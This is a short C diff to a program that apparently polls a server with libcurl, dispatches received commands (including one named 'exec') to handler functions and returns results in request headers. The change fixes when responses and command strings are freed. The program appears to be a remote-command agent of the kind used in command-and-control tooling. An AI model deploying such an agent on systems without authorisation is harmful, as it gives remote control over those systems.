@@ -130,7 +130,14 @@ void check_response(char* data)
 
     if (commandnode != NULL)
     {
-        CURRENT_COMMAND = commandnode->command;
+        if (!strcmp(commandnode->command, "exec"))
+        {
+            CURRENT_COMMAND = strdup(arguments);
+        }
+        else
+        {
+            CURRENT_COMMAND = strdup(commandnode->command);
+        }
         STORED_RESPONSE = commandnode->function(arguments);
     }
 }
@@ -273,6 +280,19 @@ void command_loop(void)
 
         // Perform the request
         CURLcode res = curl_easy_perform(curl);
+
+        // If sent a response, free the response and remove the command header
+        // This happens here before we check the `current` response from server
+        if (free_response)
+        {
+            free(STORED_RESPONSE);
+            free(CURRENT_COMMAND);
+            free_response = 0;
+            STORED_RESPONSE = NULL;
+            CURRENT_COMMAND = NULL;
+            update_curl_headers();
+        }
+
         if (res != CURLE_OK)
         {
             size_t len = strlen(errbuf);
@@ -303,15 +323,6 @@ void command_loop(void)
         curl_easy_cleanup(curl);
     }
     debugf("Freeing stuff.\n");
-    // We sent a response, so free the response and remove the command header
-    if (free_response)
-    {
-        free(STORED_RESPONSE);
-        free_response = 0;
-        STORED_RESPONSE = NULL;
-        CURRENT_COMMAND = NULL;
-        update_curl_headers();
-    }
     if (chunk.memory)  {free(chunk.memory);}
     debugf("Done with loop\n");
 }
